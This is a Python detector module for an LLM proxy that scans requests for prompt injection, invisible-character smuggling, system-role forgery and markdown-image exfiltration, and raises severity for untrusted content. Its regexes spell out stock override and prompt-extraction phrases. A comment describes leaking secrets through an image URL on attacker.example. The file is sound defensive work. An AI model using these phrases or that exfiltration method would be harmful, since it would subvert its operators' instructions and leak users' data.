"""Prompt-injection / hidden-instruction / exfiltration detectors.

These run alongside the data-leak detectors in ``detectors.py``. They focus on
the *attacker side* of LLM safety — content that tries to manipulate the model
or smuggle data out — which is qualitatively different from the *data side*
(PII/PHI/PCI/secrets going in).

Most rules are tuned to be safe-by-default: they fire on "smells" rather than
hard guarantees. The *severity* assigned reflects how confident the rule is
that the content is hostile vs. merely unusual. The policy engine then turns
severities into actions per tenant (allow / redact / block).

Channel awareness
-----------------
A request can carry **trusted** content (the user's own prompt) and
**untrusted** content (scraped pages, retrieved documents, tool outputs). Most
prompt-injection findings are tolerable in trusted content but **escalate to
HIGH** in untrusted content. The proxy sets a flag based on either:

- the ``X-Aegis-Untrusted: true`` header, or
- ``<aegis:untrusted> ... </aegis:untrusted>`` blocks the SDK can wrap around
  scraped/retrieved text.

The detectors below return ``Finding`` objects compatible with the existing
``redact_text`` / audit pipeline.
"""

from __future__ import annotations

import re
import unicodedata
from collections.abc import Iterable
from dataclasses import dataclass
from typing import Any

from .detectors import Finding, Severity

UNTRUSTED_OPEN = "<aegis:untrusted>"
UNTRUSTED_CLOSE = "</aegis:untrusted>"

# Tagged Unicode characters (U+E0000..U+E007F) — used for invisible payloads in
# real-world LLM attacks. Also detect zero-width characters which are sometimes
# used for instruction smuggling.
_INVISIBLE_CHARS = re.compile(
    r"[\u200B-\u200F\u202A-\u202E\u2060-\u206F\uFEFF\U000E0000-\U000E007F]"
)

# Patterns that *try* to override the system prompt or impersonate a system
# role. These are intentionally generous; the policy engine decides what to do
# with them based on channel trust.
_OVERRIDE_PATTERNS: list[tuple[str, re.Pattern[str], str]] = [
    (
        "instruction_override",
        re.compile(
            r"(?i)\b("
            r"ignore (?:all|any|the|your|previous|prior|above) (?:prior |previous |above |earlier )?(?:instructions?|prompts?|rules?|directives?)"
            r"|disregard (?:all|any|the|your|previous|prior|above) (?:instructions?|rules?)"
            r"|forget (?:everything|all|the) (?:above|previous|prior|earlier|that you|you were)"
            r"|override (?:your|the|all) (?:instructions?|safety|guardrails?|rules?)"
            r"|bypass (?:your|the|all) (?:safety|guardrails?|filters?|restrictions?)"
            r"|new (?:instructions?|system prompt|directive)"
            r"|from now on,? you (?:are|will|must|shall)"
            r"|pretend (?:to be|you are|that you are)"
            r"|act as (?:if you are|though you are|a) (?:dan|developer|jailbroken|unrestricted)"
            r"|you are (?:now |actually )?(?:dan|do anything now|jailbroken|unrestricted)"
            r"|enable (?:dev(?:eloper)?|debug|admin) mode"
            r")\b",
        ),
        "Attempt to override or replace prior instructions.",
    ),
    (
        "role_hijack",
        re.compile(
            r"(?i)("
            r"\bsystem\s*[:>]\s*"
            r"|<\s*\|?\s*system\s*\|?\s*>"
            r"|<\s*\|?\s*im_start\s*\|?\s*>\s*system"
            r"|\[\s*system\s*\]"
            r"|<<SYS>>"
            r"|###\s*system\s*(?:prompt|message)"
            r")",
        ),
        "Content forges or impersonates a system / control role.",
    ),
    (
        "tool_or_secret_request",
        re.compile(
            r"(?i)\b("
            r"reveal (?:the |your |all )?(?:system|hidden|secret|initial)\s*(?:prompt|instructions?|messages?)"
            r"|print (?:the |your |all )?(?:system|hidden|secret|initial)\s*(?:prompt|instructions?)"
            r"|show me (?:the |your |all )?(?:system|hidden|original|secret) (?:prompt|instructions?|messages?)"
            r"|repeat (?:everything|all the text) (?:above|before this)"
            r"|what (?:were |are )?your (?:original |initial |system )?(?:instructions?|prompt|rules?)"
            r"|exfiltrate|exfiltration"
            r")\b",
        ),
        "Attempts to extract the system prompt, hidden context, or secrets.",
    ),
    (
        "credential_harvest",
        re.compile(
            r"(?i)\b("
            r"send (?:me |us )?(?:the |your )?(?:api[_ ]?key|password|token|credential|cookie|session)"
            r"|email (?:me |us )?(?:the |your )?(?:api[_ ]?key|password|token|credential)"
            r"|post (?:the )?(?:api[_ ]?key|password|token|credential) to"
            r")\b",
        ),
        "Asks the model to transmit credentials somewhere.",
    ),
]

# Markdown-image / link exfiltration: attacker tells the model to render
# `![](https://attacker.example/?leak=...)` so the rendered image GETs the
# secret to their server.
_MARKDOWN_IMAGE_EXFIL = re.compile(
    r"!\[[^\]]{0,200}\]\(\s*(https?://[^)\s]{4,500})\s*\)"
)
_MARKDOWN_LINK_EXFIL = re.compile(
    r"\[[^\]]{0,200}\]\(\s*(https?://[^)\s]{4,500}[?#&][^)\s]{4,200})\s*\)"
)
_DATA_URI = re.compile(r"\bdata:(?:[a-zA-Z0-9.+-]+/[a-zA-Z0-9.+-]+)?[;,][^\s'\"<>]{40,}")
_HTML_COMMENT = re.compile(r"<!--[\s\S]{1,4000}?-->")
_SCRIPT_BLOCK = re.compile(r"(?is)<script\b[^>]*>[\s\S]*?</script>")
# Suspicious shorteners + raw IPs in markdown links — common in indirect attacks.
_SHORTENERS = re.compile(
    r"\bhttps?://(?:bit\.ly|tinyurl\.com|t\.co|goo\.gl|ow\.ly|is\.gd|buff\.ly|"
    r"rebrand\.ly|cutt\.ly|shorturl\.at|s\.id|lnkd\.in)/\S+",
    re.IGNORECASE,
)


@dataclass
class InjectionResult:
    findings: list[Finding]
    sanitized_text: str
    untrusted_present: bool
    spans_untrusted: list[tuple[int, int]]


def _strip_invisibles(text: str) -> tuple[str, list[Finding]]:
    """Remove zero-width / tag characters; emit findings for what we removed."""
    findings: list[Finding] = []
    if not _INVISIBLE_CHARS.search(text):
        return text, findings

    out_parts: list[str] = []
    cursor = 0
    for m in _INVISIBLE_CHARS.finditer(text):
        out_parts.append(text[cursor : m.start()])
        cursor = m.end()
        ch = text[m.start() : m.end()]
        cp = ord(ch)
        category = "tagged_unicode" if 0xE0000 <= cp <= 0xE007F else "zero_width"
        findings.append(
            Finding(
                detector=f"invisible_{category}",
                category="injection",
                severity=Severity.HIGH if category == "tagged_unicode" else Severity.MEDIUM,
                start=m.start(),
                end=m.end(),
                excerpt=f"U+{cp:04X} ({unicodedata.name(ch, 'unknown')})",
                tags=["injection", "stealth", category],
            )
        )
    out_parts.append(text[cursor:])
    return "".join(out_parts), findings


def _find_untrusted_spans(text: str) -> list[tuple[int, int]]:
    """Locate ``<aegis:untrusted>...</aegis:untrusted>`` regions.

    Spans are returned as (start_of_inner, end_of_inner) — i.e., the content,
    not the tags. Stripped from sanitized output by ``scan_injection``.
    """
    spans: list[tuple[int, int]] = []
    cursor = 0
    while True:
        i = text.find(UNTRUSTED_OPEN, cursor)
        if i < 0:
            break
        j = text.find(UNTRUSTED_CLOSE, i + len(UNTRUSTED_OPEN))
        if j < 0:
            break
        spans.append((i + len(UNTRUSTED_OPEN), j))
        cursor = j + len(UNTRUSTED_CLOSE)
    return spans


def _in_untrusted(pos: int, spans: list[tuple[int, int]]) -> bool:
    return any(s <= pos < e for s, e in spans)


def _strip_untrusted_tags(text: str) -> str:
    return text.replace(UNTRUSTED_OPEN, "").replace(UNTRUSTED_CLOSE, "")


def scan_injection(
    text: str,
    *,
    untrusted_request: bool = False,
    enabled: bool = True,
) -> InjectionResult:
    """Scan text for prompt-injection / exfiltration / stealth payloads.

    Parameters
    ----------
    text:
        Joined request text (already produced by the provider adapter).
    untrusted_request:
        ``True`` if the *whole* request was marked untrusted via header. Causes
        every finding to be elevated.
    enabled:
        Master kill-switch (per-tenant policy can disable injection scanning).
    """
    if not enabled or not text:
        return InjectionResult(findings=[], sanitized_text=text, untrusted_present=False, spans_untrusted=[])

    untrusted_spans = _find_untrusted_spans(text)
    untrusted_present = bool(untrusted_spans) or untrusted_request

    cleaned, invisible_findings = _strip_invisibles(text)
    findings: list[Finding] = list(invisible_findings)

    def _sev_for(base: Severity, pos: int) -> Severity:
        # Anything that came from untrusted content (or a fully-untrusted
        # request) is treated as high severity — we do not trust strings the
        # user did not type to issue control over the model.
        in_untrusted = untrusted_request or _in_untrusted(pos, untrusted_spans)
        if in_untrusted:
            return Severity.HIGH
        return base

    for name, pattern, _desc in _OVERRIDE_PATTERNS:
        base = Severity.HIGH if name == "credential_harvest" else Severity.MEDIUM
        for m in pattern.finditer(cleaned):
            findings.append(
                Finding(
                    detector=name,
                    category="injection",
                    severity=_sev_for(base, m.start()),
                    start=m.start(),
                    end=m.end(),
                    excerpt=cleaned[m.start() : m.end()][:80],
                    tags=["injection"],
                )
            )

    for m in _MARKDOWN_IMAGE_EXFIL.finditer(cleaned):
        findings.append(
            Finding(
                detector="markdown_image_exfil",
                category="exfiltration",
                severity=_sev_for(Severity.HIGH, m.start()),
                start=m.start(),
                end=m.end(),
                excerpt=m.group(1)[:120],
                tags=["injection", "exfiltration", "markdown"],
            )
        )

    for m in _MARKDOWN_LINK_EXFIL.finditer(cleaned):
        if _MARKDOWN_IMAGE_EXFIL.match(cleaned, m.start()):
            continue
        findings.append(
            Finding(
                detector="markdown_link_query_exfil",
                category="exfiltration",
                severity=_sev_for(Severity.MEDIUM, m.start()),
                start=m.start(),
                end=m.end(),
                excerpt=m.group(1)[:120],
                tags=["injection", "exfiltration", "markdown"],
            )
        )

    for m in _DATA_URI.finditer(cleaned):
        findings.append(
            Finding(
                detector="data_uri_payload",
                category="injection",
                severity=_sev_for(Severity.MEDIUM, m.start()),
                start=m.start(),
                end=m.end(),
                excerpt=cleaned[m.start() : m.start() + 60],
                tags=["injection", "stealth"],
            )
        )

    for m in _SCRIPT_BLOCK.finditer(cleaned):
        findings.append(
            Finding(
                detector="html_script_block",
                category="injection",
                severity=_sev_for(Severity.MEDIUM, m.start()),
                start=m.start(),
                end=m.end(),
                excerpt="<script>...</script>",
                tags=["injection", "html"],
            )
        )

    for m in _HTML_COMMENT.finditer(cleaned):
        body = cleaned[m.start() : m.end()]
        # Comments are common in scraped HTML; only flag when they contain
        # injection-shaped instructions.
        if any(p.search(body) for _n, p, _d in _OVERRIDE_PATTERNS):
            findings.append(
                Finding(
                    detector="hidden_html_comment_instruction",
                    category="injection",
                    severity=_sev_for(Severity.HIGH, m.start()),
                    start=m.start(),
                    end=m.end(),
                    excerpt=body[:80],
                    tags=["injection", "stealth", "html"],
                )
            )

    for m in _SHORTENERS.finditer(cleaned):
        findings.append(
            Finding(
                detector="url_shortener",
                category="injection",
                severity=_sev_for(Severity.LOW, m.start()),
                start=m.start(),
                end=m.end(),
                excerpt=m.group(0)[:120],
                tags=["injection", "url"],
            )
        )

    findings.sort(key=lambda f: (f.start, -f.end))

    sanitized = _strip_untrusted_tags(cleaned)
    return InjectionResult(
        findings=findings,
        sanitized_text=sanitized,
        untrusted_present=untrusted_present,
        spans_untrusted=untrusted_spans,
    )


def severities_summary(findings: Iterable[Finding]) -> dict[str, Any]:
    out = {"low": 0, "medium": 0, "high": 0}
    for f in findings:
        out[f.severity.value] += 1
    return out
